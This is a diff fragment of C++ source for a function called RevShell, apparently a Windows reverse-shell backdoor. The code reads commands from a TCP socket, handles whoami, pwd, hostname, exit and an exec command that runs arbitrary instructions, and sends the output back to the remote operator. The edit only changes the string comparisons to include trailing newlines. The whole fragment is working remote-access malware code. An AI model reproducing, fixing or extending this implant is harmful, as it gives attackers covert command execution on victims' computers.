@@ -92,23 +92,23 @@ void RevShell() {
             int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN, 0);   //int value of buffer. Recv() returns a message received from a socket.
 
             std::cout << "Recieved: " << CommandGiven << std::endl;
-            std::cout << "Length of command: " << results << std::endl;
+            std::cout << "Length of command: " << results - 1 << std::endl;
 
-            if ((strcmp(CommandGiven, "whoami") == 0)) {
+            if ((strcmp(CommandGiven, "whoami\n") == 0)) {
                 char temp[257] = "";
                 whoami(temp, 257);
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
                 memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
             }
-            else if ((strcmp(CommandGiven, "pwd") == 0)) {
+            else if ((strcmp(CommandGiven, "pwd\n") == 0)) {
                 char temp[257] = "";
                 pwd(temp, 257);
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
                 memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
             }
-            else if ((strcmp(CommandGiven, "hostname") == 0)) {
+            else if ((strcmp(CommandGiven, "hostname\n") == 0)) {
                 char temp[257] = "";
                 getHostname(temp, 257);
                 strcat(temp, "\n");
@@ -116,7 +116,7 @@ void RevShell() {
                 memset(temp, 0, sizeof(temp));
                 memset(CommandGiven, 0, sizeof(CommandGiven));
             }
-            else if ((strcmp(CommandGiven, "exit") == 0)) {
+            else if ((strcmp(CommandGiven, "exit\n") == 0)) {
                 closesocket(tcpsock);
                 WSACleanup();
                 exit(0);
@@ -131,7 +131,7 @@ void RevShell() {
                         nval[i] = CommandGiven[i];
                     }
                 }
-                if ((strcmp(nval, "exec") == 0)) {
+                if ((strcmp(nval, "exec\n") == 0)) {
                     char executionCmd[DEFAULT_BUFLEN] = "";
                     int tempval = 0;
                     for (int i = 5; i < (*(&CommandGiven + 1) - CommandGiven); ++i) {
